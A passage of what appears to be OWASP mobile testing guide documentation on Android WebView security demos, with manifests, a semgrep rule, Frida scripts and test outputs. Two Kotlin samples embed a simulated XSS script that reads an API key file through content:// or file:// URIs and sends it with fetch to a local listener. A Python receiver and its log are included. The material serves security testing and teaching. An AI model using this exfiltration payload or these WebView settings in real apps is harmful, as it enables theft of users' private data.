android:authorities=\"org.owasp.mastestapp.fileprovider\"\n            android:exported=\"false\"\n            android:grantUriPermissions=\"true\"&gt;\n            &lt;meta-data\n                android:name=\"android.support.FILE_PROVIDER_PATHS\"\n                android:resource=\"@xml/filepaths\" /&gt;\n        &lt;/provider&gt;\n\n    &lt;/application&gt;\n\n&lt;/manifest&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" android:compileSdkVersion=\"34\" android:compileSdkVersionCodename=\"14\" package=\"org.owasp.mastestapp\" platformBuildVersionCode=\"34\" platformBuildVersionName=\"14\"&gt;\n    &lt;uses-permission android:name=\"android.permission.INTERNET\"/&gt;\n    &lt;permission android:name=\"org.owasp.mastestapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION\" android:protectionLevel=\"signature\"/&gt;\n    &lt;uses-permission android:name=\"org.owasp.mastestapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION\"/&gt;\n    &lt;application android:allowBackup=\"true\" android:appComponentFactory=\"androidx.core.app.CoreComponentFactory\" android:dataExtractionRules=\"@xml/data_extraction_rules\" android:debuggable=\"true\" android:extractNativeLibs=\"false\" android:fullBackupContent=\"@xml/backup_rules\" android:icon=\"@mipmap/ic_launcher\" android:label=\"@string/app_name\" android:roundIcon=\"@mipmap/ic_launcher_round\" android:supportsRtl=\"true\" android:testOnly=\"true\" android:theme=\"@style/Theme.MASTestApp\" android:usesCleartextTraffic=\"true\"&gt;\n        &lt;activity android:exported=\"true\" android:name=\"org.owasp.mastestapp.MainActivityWebView\" android:theme=\"@style/Theme.MASTestApp\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\"/&gt;\n                &lt;category android:name=\"android.intent.category.LAUNCHER\"/&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n        &lt;provider android:authorities=\"org.owasp.mastestapp.fileprovider\" android:exported=\"false\" android:grantUriPermissions=\"true\" android:name=\"androidx.core.content.FileProvider\"&gt;\n            &lt;meta-data android:name=\"android.support.FILE_PROVIDER_PATHS\" android:resource=\"@xml/filepaths\"/&gt;\n        &lt;/provider&gt;\n        &lt;activity android:exported=\"true\" android:name=\"androidx.compose.ui.tooling.PreviewActivity\"/&gt;\n        &lt;activity android:exported=\"true\" android:name=\"androidx.activity.ComponentActivity\"/&gt;\n        &lt;provider android:authorities=\"org.owasp.mastestapp.androidx-startup\" android:exported=\"false\" android:name=\"androidx.startup.InitializationProvider\"&gt;\n            &lt;meta-data android:name=\"androidx.emoji2.text.EmojiCompatInitializer\" android:value=\"androidx.startup\"/&gt;\n            &lt;meta-data android:name=\"androidx.lifecycle.ProcessLifecycleInitializer\" android:value=\"androidx.startup\"/&gt;\n            &lt;meta-data android:name=\"androidx.profileinstaller.ProfileInstallerInitializer\" android:value=\"androidx.startup\"/&gt;\n        &lt;/provider&gt;\n        &lt;receiver android:directBootAware=\"false\" android:enabled=\"true\" android:exported=\"true\" android:name=\"androidx.profileinstaller.ProfileInstallReceiver\" android:permission=\"android.permission.DUMP\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.INSTALL_PROFILE\"/&gt;\n            &lt;/intent-filter&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.SKIP_FILE\"/&gt;\n            &lt;/intent-filter&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.SAVE_PROFILE\"/&gt;\n            &lt;/intent-filter&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.BENCHMARK_OPERATION\"/&gt;\n            &lt;/intent-filter&gt;\n        &lt;/receiver&gt;\n    &lt;/application&gt;\n&lt;/manifest&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;paths&gt;\n    &lt;files-path name=\"internal_files\" path=\".\" /&gt;\n&lt;/paths&gt;\n</code></pre>","tags":["android","demo","MASTG-TEST-0250"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0029/MASTG-DEMO-0029/#steps","title":"Steps","text":"<p>Run  semgrep rules against the sample code.</p> ../../../../rules/mastg-android-webview-allow-local-access.yml<pre><code>rules:\n  - id: mastg-android-webview-settings\n    severity: INFO\n    languages:\n      - java\n    metadata:\n      summary: This rule detects WebView settings related to local file access and JavaScript execution.\n    message: \"[MASVS-PLATFORM-2] Detected WebView settings.\"\n    pattern-either:\n      - pattern: $WEBVIEW.getSettings(...);\n      - pattern: $SETTINGS.setJavaScriptEnabled($ARG);\n      - pattern: $SETTINGS.setAllowContentAccess($ARG);\n      - pattern: $SETTINGS.setAllowFileAccessFromFileURLs($ARG);\n      - pattern: $SETTINGS.setAllowFileAccess($ARG);\n      - pattern: $SETTINGS.setAllowUniversalAccessFromFileURLs($ARG);\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-webview-allow-local-access.yml ./MastgTestWebView_reversed.java &gt; output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0250"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0029/MASTG-DEMO-0029/#observation","title":"Observation","text":"<p>The output shows 4 results related to WebView configuration calls. However, it is important to note that the method <code>setAllowContentAccess</code> is not explicitly called in the code.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 3 Code Findings \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTestWebView_reversed.java\n     \u2771 rules.mastg-android-webview-settings\n          [MASVS-PLATFORM-2] Detected WebView settings.\n\n           27\u2506 WebSettings $this$mastgTest_u24lambda_u240 = webView.getSettings();\n            \u22ee\u2506----------------------------------------\n           28\u2506 $this$mastgTest_u24lambda_u240.setJavaScriptEnabled(true);\n            \u22ee\u2506----------------------------------------\n           29\u2506 $this$mastgTest_u24lambda_u240.setAllowUniversalAccessFromFileURLs(true);\n</code></pre>","tags":["android","demo","MASTG-TEST-0250"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0029/MASTG-DEMO-0029/#evaluation","title":"Evaluation","text":"<p>The test fails due to the following WebView settings being configured:</p> evaluation.txt<pre><code>setJavaScriptEnabled: True\nsetAllowContentAccess: True\nsetAllowUniversalAccessFromFileURLs: True\n</code></pre> <p>The method <code>setAllowContentAccess</code> is not explicitly called in the code, which means it remains at its default value (<code>true</code>).</p>","tags":["android","demo","MASTG-TEST-0250"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0030/MASTG-DEMO-0030/","title":"MASTG-DEMO-0030: Uses of WebViews Allowing Content Access with Frida","text":"<p>  Download MASTG-DEMO-0030 APK   Open MASTG-DEMO-0030 Folder  Build MASTG-DEMO-0030 APK</p>","tags":["android","demo","MASTG-TEST-0251"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0030/MASTG-DEMO-0030/#sample","title":"Sample","text":"<p>This sample demonstrates the use of WebViews allowing content access in an Android app and how an attacker could exploit these settings to exfiltrate sensitive data from the app's internal storage using content URIs.</p> AndroidManifest.xmlfilepaths.xmlMastgTestWebView.kt <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"&gt;\n\n    &lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt;\n\n    &lt;application\n        android:allowBackup=\"true\"\n        android:usesCleartextTraffic=\"true\"\n        android:dataExtractionRules=\"@xml/data_extraction_rules\"\n        android:fullBackupContent=\"@xml/backup_rules\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:label=\"@string/app_name\"\n        android:roundIcon=\"@mipmap/ic_launcher_round\"\n        android:supportsRtl=\"true\"\n        android:theme=\"@style/Theme.MASTestApp\"\n        tools:targetApi=\"31\"&gt;\n        &lt;activity\n            android:name=\".MainActivityWebView\"\n            android:exported=\"true\"\n            android:theme=\"@style/Theme.MASTestApp\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n\n                &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n        &lt;provider\n            android:name=\"androidx.core.content.FileProvider\"\n            android:authorities=\"org.owasp.mastestapp.fileprovider\"\n            android:exported=\"false\"\n            android:grantUriPermissions=\"true\"&gt;\n            &lt;meta-data\n                android:name=\"android.support.FILE_PROVIDER_PATHS\"\n                android:resource=\"@xml/filepaths\" /&gt;\n        &lt;/provider&gt;\n\n    &lt;/application&gt;\n\n&lt;/manifest&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;paths&gt;\n    &lt;files-path name=\"internal_files\" path=\".\" /&gt;\n&lt;/paths&gt;\n</code></pre> <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.webkit.WebView\nimport java.io.*\n\n/**\n * This class writes a sensitive file (\"api-key.txt\") into internal storage and then loads a vulnerable\n * page into a WebView. That page simulates an XSS injection:\n * an attacker's script (running in the context of the vulnerable page) makes an `XMLHttpRequest` to\n * read the sensitive file via the content provider and then uses `fetch` to send the content to an external server.\n *\n * By loading the page with a `file://` base URL and enabling universal access from file URLs,\n * we relax the default restriction (which would otherwise treat `content://` requests as opaque origin)\n * and allow the `XMLHttpRequest` to succeed.\n */\nclass MastgTestWebView(private val context: Context) {\n\n    fun mastgTest(webView: WebView) {\n        // Write a sensitive file (for example, cached credentials or private data).\n        val sensitiveFile = File(context.filesDir, \"api-key.txt\")\n        sensitiveFile.writeText(\"MASTG_API_KEY=072037ab-1b7b-4b3b-8b7b-1b7b4b3b8b7b\")\n\n        // Configure the WebView.\n        webView.settings.apply {\n            /* `javaScriptEnabled` is required for the attacker's script to even execute.\n             * This is very common in WebViews, unless they only load static content.\n            */\n            javaScriptEnabled = true\n\n            /* `allowUniversalAccessFromFileURLs` is required in this attack since it\n             * relaxes the default restrictions so that pages loaded from file:// can access\n             * content from any origin (including content:// URIs).\n             *\n             * If this is not set, the following error will be logged in logcat:\n             *\n             *   [INFO:CONSOLE(0)] \"Access to XMLHttpRequest at 'content://org.owasp.mastestapp.provider/sensitive.txt'\n             *   from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported\n             *   for protocol schemes: http, data, chrome, https, chrome-untrusted.\", source: file:/// (0)\n             *\n             * Note that the fetch to the external server will still work, but the retrieval of the file content via content:// will fail.\n            */\n            allowUniversalAccessFromFileURLs = true\n\n\n            /* `allowContentAccess` is intentionally not set to false to showcase the default behavior.\n             * If we were to disable content provider access,\n             * this would prevent the attacker's script from accessing the sensitive file via the content provider.\n             */\n            // allowContentAccess = false\n\n        }\n\n        // Vulnerable HTML simulating an XSS injection.\n        // The attacker-injected script uses XMLHttpRequest to load the sensitive file from the content provider.\n        val vulnerableHtml = \"\"\"\n            &lt;html&gt;\n              &lt;head&gt;\n                &lt;meta charset=\"utf-8\"&gt;\n                &lt;title&gt;MASTG-DEMO-0030&lt;/title&gt;\n              &lt;/head&gt;\n              &lt;body&gt;\n                &lt;h1&gt;MASTG-DEMO-0030&lt;/h1&gt;\n                &lt;p&gt;This HTML page is vulnerable to XSS. An attacker was able to inject JavaScript to exfiltrate data from the app internal storage using content:// URIs.&lt;/p&gt;\n                &lt;p&gt;The file is located in /data/data/org.owasp.mastestapp/files/&lt;/p&gt;\n                &lt;p&gt;NOTE: For demo purposes we display the exfiltrated data on screen. However, the user wouldn't even notice as the data is exfiltrated silently.&lt;/p&gt;\n                &lt;script type=\"text/javascript\"&gt;\n                  function exfiltrate(data) {\n\n                    var output = document.createElement(\"div\");\n                    output.style.color = \"white\";\n                    output.style.borderRadius = \"5px\";\n                    output.style.backgroundColor = \"red\";\n                    output.style.padding = \"1em\";\n                    output.style.marginTop = \"1em\";\n                    output.innerHTML = \"&lt;strong&gt;Exfiltrated Data:&lt;/strong&gt;&lt;br&gt;\" + data;\n                    document.body.appendChild(output);\n\n                    // Send the text file content to the external server\n                    fetch('http://10.0.2.2:5001/receive', {\n                        method: 'POST',\n                        headers: {\n                            'Content-Type': 'text/plain'\n                        },\n                        body: data\n                    })\n                    .then(response =&gt; console.log('File content sent successfully.'))\n                    .catch(err =&gt; console.error('Error sending file content:', err));\n                  }\n                  function readSensitiveFile() {\n                    var xhr = new XMLHttpRequest();\n                    xhr.onreadystatechange = function() {\n                      if (xhr.readyState === 4) {\n                        if (xhr.status === 200) {\n                          exfiltrate(xhr.responseText);\n                        } else {\n                          exfiltrate(\"Error reading file: \" + xhr.status);\n                        }\n                      }\n                    };\n                    // The injected script accesses the sensitive file via the content provider.\n                    xhr.open(\"GET\", \"content://org.owasp.mastestapp.fileprovider/internal_files/api-key.txt\", true);\n                    xhr.send();\n                  }\n                  // Simulate the injected payload triggering.\n                  readSensitiveFile();\n                &lt;/script&gt;\n              &lt;/body&gt;\n            &lt;/html&gt;\n        \"\"\".trimIndent()\n\n\n        // Load the vulnerable HTML.\n        // Using a base URL with the file:// scheme gives the page a non\u2011opaque origin (using content:/// works the same way).\n        webView.loadDataWithBaseURL(\n            \"file:///\",\n            vulnerableHtml,\n            \"text/html\",\n            \"UTF-8\",\n            null\n        )\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0251"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0030/MASTG-DEMO-0030/#androidmanifestxml","title":"AndroidManifest.xml","text":"<p>The app declares a content provider in the <code>AndroidManifest.xml</code> file, specifically a <code>FileProvider</code> with access to the app's internal storage as specified in the <code>filepaths.xml</code> file.</p> <p>Note that for the exfiltration to work we include the <code>android:usesCleartextTraffic=\"true\"</code> attribute in the <code>AndroidManifest.xml</code> file to allow cleartext traffic. However, the same script would work with HTTPS endpoints.</p>","tags":["android","demo","MASTG-TEST-0251"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0030/MASTG-DEMO-0030/#mastgtestwebviewkt","title":"MastgTestWebView.kt","text":"<p>The code includes a script that demonstrates how an attacker could exploit the WebView settings to exfiltrate sensitive data from the app's internal storage using content URIs (<code>content://</code>).</p> <p>This sample:</p> <ul> <li>writes a sensitive file (<code>api-key.txt</code>) into internal storage using <code>File.writeText()</code>.</li> <li>configures a WebView to<ul> <li>allow JavaScript execution (<code>javaScriptEnabled = true</code>).</li> <li>allow universal access from file URLs (<code>allowUniversalAccessFromFileURLs = true</code>). Otherwise, the <code>XMLHttpRequest</code> to a <code>content://</code> URI from a <code>file://</code> base URL would be blocked due to CORS policy.</li> <li>content access is allowed by default (not explicitly called).</li> </ul> </li> <li>to simulate an XSS attack, the WebView uses <code>loadDataWithBaseURL</code> to load an HTML page with embedded JavaScript controlled by the attacker.</li> </ul>","tags":["android","demo","MASTG-TEST-0251"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0030/MASTG-DEMO-0030/#html-and-javascript","title":"HTML and JavaScript","text":"<p>See <code>vulnerableHtml</code> in the MastgTestWebView.kt file.</p> <ol> <li>The attacker's script (running in the context of the vulnerable page) uses <code>XMLHttpRequest</code> to load the sensitive file from the content provider. The file is located at <code>/data/data/org.owasp.mastestapp/files/api-key.txt</code></li> <li><code>fetch</code> is used to send the file contents to an external server running on the host machine while the app is executed in the Android emulator (<code>http://10.0.2.2:5001/receive</code>).</li> </ol> <p>Note: For demonstration purposes, the exfiltrated data is displayed on screen. However, in a real attack scenario, the user would not notice as the data would be exfiltrated silently.</p>","tags":["android","demo","MASTG-TEST-0251"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0030/MASTG-DEMO-0030/#serverpy","title":"server.py","text":"<p>A simple Python server that listens for incoming requests on port 5001 and logs the received data.</p> server.py<pre><code>import http.server\nimport socketserver\nimport json\n\nclass Handler(http.server.BaseHTTPRequestHandler):\n\n    def do_POST(self):\n        length = int(self.headers.get('Content-Length', 0))\n        data = self.rfile.read(length)\n        text = data.decode('utf-8')\n        print(f'\\n\\n[*] Received POST data from {self.client_address[0]}:\\n')\n        try:\n            parsed = json.loads(text)\n            pretty = json.dumps(parsed, indent=4)\n            print(pretty)\n        except Exception as e:\n            print(text)\n        self.send_response(200)\n        self.send_header('Access-Control-Allow-Origin', '*')\n        self.end_headers()\n\n    def log_message(self, format, *args):\n        # Suppress the default logging\n        pass\n\nif __name__ == '__main__':\n    with socketserver.TCPServer(('0.0.0.0', 5001), Handler) as httpd:\n        print('Serving on port 5001...')\n        httpd.serve_forever()\n</code></pre>","tags":["android","demo","MASTG-TEST-0251"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0030/MASTG-DEMO-0030/#steps","title":"Steps","text":"<ol> <li>Install the app on a device ( Installing Apps)</li> <li>Make sure you have  Frida for Android installed on your machine and the frida-server running on the device</li> <li>Run <code>run.sh</code> to spawn the app with Frida</li> <li>Click the Start button</li> <li>Stop the script by pressing <code>Ctrl+C</code> and/or <code>q</code> to quit the Frida CLI</li> </ol> run.shscript.js <pre><code>#!/bin/bash\nfrida -U -f org.owasp.mastestapp -l ./script.js -o output.txt\n</code></pre> <pre><code>// Configuration parameter:\n// Set to true to wait for the first call to getSettings() before enumerating WebViews.\n// Set to false to enumerate immediately.\nvar delayEnumerationUntilGetSettings = true;\n\nJava.perform(function() {\n  var seenWebViews = {};\n  var internalCall = false; // Flag to indicate internal calls\n\n  // Function to print backtrace with a configurable number of lines (default: 5)\n  function printBacktrace(maxLines = 8) {\n    let Exception = Java.use(\"java.lang.Exception\");\n    let stackTrace = Exception.$new().getStackTrace().toString().split(\",\");\n\n    console.log(\"\\nBacktrace:\");\n    for (let i = 0; i &lt; Math.min(maxLines, stackTrace.length); i++) {\n        console.log(stackTrace[i]);\n    }\n    console.log(\"\\n\");\n  }\n\n  function enumerateWebViews() {\n    Java.choose(\"android.webkit.WebView\", {\n      onMatch: function(instance) {\n        var id = instance.toString();\n        if (seenWebViews[id]) return;  // Skip if already seen\n        seenWebViews[id] = true;\n        Java.scheduleOnMainThread(function() {\n          console.log(`\\n[*] Found WebView instance: ${id}`);\n          try {\n            internalCall = true; // Set flag before calling getSettings\n            var settings = instance.getSettings();\n            internalCall = false; // Reset flag after calling getSettings\n            console.log(`\\t[+] JavaScriptEnabled: ${settings.getJavaScriptEnabled()}`);\n            console.log(`\\t[+] AllowFileAccess: ${settings.getAllowFileAccess()}`);\n            console.log(`\\t[+] AllowFileAccessFromFileURLs: ${settings.getAllowFileAccessFromFileURLs()}`);\n            console.log(`\\t[+] AllowUniversalAccessFromFileURLs: ${settings.getAllowUniversalAccessFromFileURLs()}`);\n            console.log(`\\t[+] AllowContentAccess: ${settings.getAllowContentAccess()}`);\n            console.log(`\\t[+] MixedContentMode: ${settings.getMixedContentMode()}`);\n            console.log(`\\t[+] SafeBrowsingEnabled: ${settings.getSafeBrowsingEnabled()}`);\n          } catch (err) {\n            console.log(`\\t[-] Error reading settings: ${err}`);\n          }\n        });\n      },\n      onComplete: function() {\n        console.log(\"\\n[*] Finished enumerating WebView instances!\");\n      }\n    });\n  }\n\n  var WebView = Java.use(\"android.webkit.WebView\");\n\n  if (delayEnumerationUntilGetSettings) {\n    var enumerationTriggered = false;\n    WebView.getSettings.implementation = function() {\n      if (internalCall) {\n        return this.getSettings(); // Return immediately if it's an internal call\n      }\n      var settings = this.getSettings();\n      var id = this.toString();\n      console.log(`\\n[*] WebView.getSettings() called on instance: ${id}`);\n      printBacktrace();\n      if (!enumerationTriggered) {\n        enumerationTriggered = true;\n        Java.scheduleOnMainThread(function() {\n          console.log(\"\\n[*] Triggering enumeration after getSettings() call...\");\n          enumerateWebViews();\n        });\n      }\n      return settings;\n    };\n  } else {\n    enumerateWebViews();\n  }\n});\n</code></pre> <p>The Frida script is designed to enumerate instances of <code>WebView</code> in the application and list their configuration values. The script does not explicitly hook the setters of the <code>WebView</code> settings but instead calls the <code>getSettings()</code> method to retrieve the current configuration.</p> <p>The script performs the following steps:</p> <ol> <li>Enumerates all instances of <code>WebView</code> in the application.</li> <li>For each <code>WebView</code> instance, it calls the <code>getSettings()</code> method to retrieve the current settings.</li> <li>Prints the configuration values of the <code>WebView</code> settings.</li> <li>Prints a backtrace when the <code>getSettings()</code> method is called to help identify where in the code the settings are being accessed.</li> </ol>","tags":["android","demo","MASTG-TEST-0251"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0030/MASTG-DEMO-0030/#observation","title":"Observation","text":"<p>The output shows that Frida found one WebView instance and lists many of the WebView settings. A backtrace is also provided to help identify where in the code the settings are being accessed.</p> output.txt<pre><code>[*] WebView.getSettings() called on instance: android.webkit.WebView{5c7fac1 VFEDHVC.. ......I. 0,0-0,0}\n\nBacktrace:\nandroid.webkit.WebView.getSettings(Native Method)\norg.owasp.mastestapp.MastgTestWebView.mastgTest(MastgTestWebView.kt:25)\norg.owasp.mastestapp.MainActivityWebViewKt$WebViewScreen$1$1$2$1.invoke(MainActivityWebView.kt:88)\norg.owasp.mastestapp.MainActivityWebViewKt$WebViewScreen$1$1$2$1.invoke(MainActivityWebView.kt:85)\nandroidx.compose.ui.viewinterop.ViewFactoryHolder.&lt;init&gt;(AndroidView.android.kt:343)\nandroidx.compose.ui.viewinterop.AndroidView_androidKt$createAndroidViewNodeFactory$1.invoke(AndroidView.android.kt:274)\nandroidx.compose.ui.viewinterop.AndroidView_androidKt$createAndroidViewNodeFactory$1.invoke(AndroidView.android.kt:273)\nandroidx.compose.ui.viewinterop.AndroidView_androidKt$AndroidView$$inlined$ComposeNode$1.invoke(Composables.kt:254)\n\n\n\n[*] Triggering enumeration after getSettings() call...\n\n[*] Finished enumerating WebView instances!\n\n[*] Found WebView instance: android.webkit.WebView{5c7fac1 VFEDHVC.. ........ 0,0-904,1796}\n    [+] JavaScriptEnabled: true\n    [+] AllowFileAccess: false\n    [+] AllowFileAccessFromFileURLs: false\n    [+] AllowUniversalAccessFromFileURLs: true\n    [+] AllowContentAccess: true\n    [+] MixedContentMode: 1\n    [+] SafeBrowsingEnabled: true\n</code></pre> <p>We can also see how the sensitive data was exfiltrated to the attacker's server by inspecting the server logs.</p> output_server.txt<pre><code>Serving on port 5001...\n\n\n[*] Received POST data from 127.0.0.1:\n\nMASTG_API_KEY=072037ab-1b7b-4b3b-8b7b-1b7b4b3b8b7b\n</code></pre>","tags":["android","demo","MASTG-TEST-0251"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0030/MASTG-DEMO-0030/#evaluation","title":"Evaluation","text":"<p>The test fails due to the following WebView settings being configured:</p> evaluation.txt<pre><code>JavaScriptEnabled: True\nAllowContentAccess: True\nAllowUniversalAccessFromFileURLs: True\n</code></pre> <p>Note that the method <code>setAllowContentAccess</code> is not explicitly called in the code. However, using this approach we can't really tell since we're inspecting the WebView settings after they have been configured.</p> <p>As indicated by the backtrace in the output, the settings were called in the <code>mastgTest</code> method of the <code>MastgTestWebView</code> class. Since this app is a demo and code obfuscation tools like ProGuard or R8 are not applied, we can even see the exact file name and line number where the settings were configured: <code>MastgTestWebView.kt:25</code>. In a production build, this information is typically removed or obfuscated unless explicitly preserved.</p>","tags":["android","demo","MASTG-TEST-0251"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0031/MASTG-DEMO-0031/","title":"MASTG-DEMO-0031: Uses of WebViews Allowing Local File Access with Frida","text":"<p>  Download MASTG-DEMO-0031 APK   Open MASTG-DEMO-0031 Folder  Build MASTG-DEMO-0031 APK</p>","tags":["android","demo","MASTG-TEST-0253"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0031/MASTG-DEMO-0031/#sample","title":"Sample","text":"<p>This sample demonstrates the use of WebViews allowing local file access in an Android app and how an attacker could exploit these settings to exfiltrate sensitive data from the app's internal storage using file URIs.</p> AndroidManifest.xmlMastgTestWebView.kt <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"&gt;\n\n    &lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt;\n\n    &lt;application\n        android:allowBackup=\"true\"\n        android:usesCleartextTraffic=\"true\"\n        android:dataExtractionRules=\"@xml/data_extraction_rules\"\n        android:fullBackupContent=\"@xml/backup_rules\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:label=\"@string/app_name\"\n        android:roundIcon=\"@mipmap/ic_launcher_round\"\n        android:supportsRtl=\"true\"\n        android:theme=\"@style/Theme.MASTestApp\"\n        tools:targetApi=\"31\"&gt;\n        &lt;activity\n            android:name=\".MainActivityWebView\"\n            android:exported=\"true\"\n            android:theme=\"@style/Theme.MASTestApp\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n\n                &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n    &lt;/application&gt;\n\n&lt;/manifest&gt;\n</code></pre> <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.webkit.WebView\nimport java.io.*\n\n/**\n * This class writes a sensitive file (\"api-key.txt\") into internal storage and then loads a vulnerable\n * page into a WebView. That page simulates an XSS injection:\n * an attacker's script (running in the context of the vulnerable page) makes an `XMLHttpRequest` to\n * read the sensitive file via the file system and then uses `fetch` to send the content to an external server.\n *\n * By loading the page with a `file://` base URL and enabling universal access from file URLs,\n * we relax the default restriction (which would otherwise treat `file://` requests as opaque origin)\n * and allow the `XMLHttpRequest` to succeed.\n */\nclass MastgTestWebView(private val context: Context) {\n\n    fun mastgTest(webView: WebView) {\n        // Write a sensitive file (for example, cached credentials or private data).\n        val sensitiveFile = File(context.filesDir, \"api-key.txt\")\n        sensitiveFile.writeText(\"MASTG_API_KEY=072037ab-1b7b-4b3b-8b7b-1b7b4b3b8b7b\")\n        val filePath = sensitiveFile.absolutePath\n\n        // Configure the WebView.\n        webView.settings.apply {\n            /* `javaScriptEnabled` is required for the attacker's script to even execute.\n             * This is very common in WebViews, unless they only load static content.\n            */\n            javaScriptEnabled = true\n\n            /* `allowFileAccess` is required in this attack since it\n             * allows the WebView to load local files from the app's internal or external storage.\n             * This app has a `minSdkVersion` of 29, the default value is `true`\n             * unless you run it on a device with an API level of 30 or higher.\n            */\n            allowFileAccess = true\n\n            /* `allowFileAccessFromFileURLs` is required in this attack since it\n             * lets JavaScript within those local files access other local files.\n            */\n            allowFileAccessFromFileURLs = true\n\n            /* `allowUniversalAccessFromFileURLs` is not really required in this attack because\n             * the `allowFileAccessFromFileURLs` setting already allows the attacker's script to\n             * access the sensitive file via the file system.\n            */\n            // allowUniversalAccessFromFileURLs = true\n        }\n\n        // Vulnerable HTML simulating an XSS injection.\n        // The attacker-injected script uses XMLHttpRequest to load the sensitive file from the file system.\n        val vulnerableHtml = \"\"\"\n            &lt;html&gt;\n              &lt;head&gt;\n                &lt;meta charset=\"utf-8\"&gt;\n                &lt;title&gt;MASTG-DEMO&lt;/title&gt;\n              &lt;/head&gt;\n              &lt;body&gt;\n                &lt;h1&gt;MASTG-DEMO-0031&lt;/h1&gt;\n                &lt;p&gt;This HTML page is vulnerable to XSS. An attacker was able to inject JavaScript to exfiltrate data from the app internal storage using file:// URIs.&lt;/p&gt;\n                &lt;p&gt;The file is located in $filePath&lt;/p&gt;\n                &lt;p&gt;NOTE: For demo purposes we display the exfiltrated data on screen. However, the user wouldn't even notice as the data is exfiltrated silently.&lt;/p&gt;\n                &lt;script type=\"text/javascript\"&gt;\n                  function exfiltrate(data) {\n\n                    var output = document.createElement(\"div\");\n                    output.style.color = \"white\";\n                    output.style.borderRadius = \"5px\";\n                    output.style.backgroundColor = \"red\";\n                    output.style.padding = \"1em\";\n                    output.style.marginTop = \"1em\";\n                    output.innerHTML = \"&lt;strong&gt;Exfiltrated Data:&lt;/strong&gt;&lt;br&gt;\" + data;\n                    document.body.appendChild(output);\n\n                    // Send the text file content to the external server\n                    fetch('http://10.0.2.2:5001/receive', {\n                        method: 'POST',\n                        headers: {\n                            'Content-Type': 'text/plain'\n                        },\n                        body: data\n                    })\n                    .then(response =&gt; console.log('File content sent successfully.'))\n                    .catch(err =&gt; console.error('Error sending file content:', err));\n                  }\n                    function readSensitiveFile() {\n                      var xhr = new XMLHttpRequest();\n                      xhr.onreadystatechange = function() {\n                        if (xhr.readyState === XMLHttpRequest.DONE) {\n                          // For local file requests, a status of 0 with a non-empty responseText indicates success.\n                          if (xhr.status === 200 || (xhr.status === 0 &amp;&amp; xhr.responseText)) {\n                            exfiltrate(xhr.responseText);\n                          } else {\n                            exfiltrate(\"Error reading file: \" + xhr.status);\n                          }\n                        }\n                      };\n\n                      xhr.onerror = function() {\n                        exfiltrate(\"Network error occurred while reading the file.\");\n                      };\n\n                      xhr.open(\"GET\", \"$filePath\", true);\n                      xhr.send();\n                    }\n                  // Simulate the injected payload triggering.\n                  readSensitiveFile();\n                &lt;/script&gt;\n              &lt;/body&gt;\n            &lt;/html&gt;\n        \"\"\".trimIndent()\n\n        // Load the vulnerable HTML.\n        // Using a base URL with the file:// scheme gives the page a non\u2011opaque origin (using content:/// works 